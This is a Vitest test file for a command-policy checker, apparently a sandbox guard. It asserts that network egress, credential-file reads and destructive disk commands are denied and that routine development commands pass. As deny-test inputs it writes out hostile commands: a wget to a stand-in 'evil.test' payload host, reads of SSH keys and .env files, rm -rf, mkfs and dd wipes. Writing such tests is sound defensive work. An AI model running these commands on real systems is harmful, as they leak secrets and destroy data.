import { describe, expect, it } from "vitest";
import { evaluateCommandPolicy } from "./policy.js";

describe("evaluateCommandPolicy", () => {
  it("denies outbound network commands", () => {
    expect(evaluateCommandPolicy("curl https://example.com/exfil")).toMatchObject({
      id: "network-egress",
    });
    expect(evaluateCommandPolicy("wget http://evil.test/payload")).toMatchObject({
      id: "network-egress",
    });
    expect(evaluateCommandPolicy("ssh user@host")).toMatchObject({ id: "network-egress" });
  });

  it("denies commands that touch credential material", () => {
    expect(evaluateCommandPolicy("cat .env")).toMatchObject({ id: "secret-file-access" });
    expect(evaluateCommandPolicy("printenv | grep ARK_API_KEY")).toMatchObject({
      id: "secret-file-access",
    });
    expect(evaluateCommandPolicy("cat ~/.ssh/id_rsa")).toMatchObject({
      id: "secret-file-access",
    });
  });

  it("denies destructive filesystem commands", () => {
    expect(evaluateCommandPolicy("rm -rf /workspace")).toMatchObject({
      id: "destructive-filesystem",
    });
    expect(evaluateCommandPolicy("rm -fr /tmp/build")).toMatchObject({
      id: "destructive-filesystem",
    });
    expect(evaluateCommandPolicy("mkfs.ext4 /dev/sda1")).toMatchObject({
      id: "destructive-filesystem",
    });
    expect(evaluateCommandPolicy("dd if=/dev/zero of=/dev/sda")).toMatchObject({
      id: "destructive-filesystem",
    });
  });

  it("allows ordinary development commands", () => {
    expect(evaluateCommandPolicy("ls -la")).toBeNull();
    expect(evaluateCommandPolicy("npm test")).toBeNull();
    expect(evaluateCommandPolicy("echo hello > hello.txt")).toBeNull();
    expect(evaluateCommandPolicy("rm file.txt")).toBeNull();
    expect(evaluateCommandPolicy("rm -f onefile")).toBeNull();
  });
});
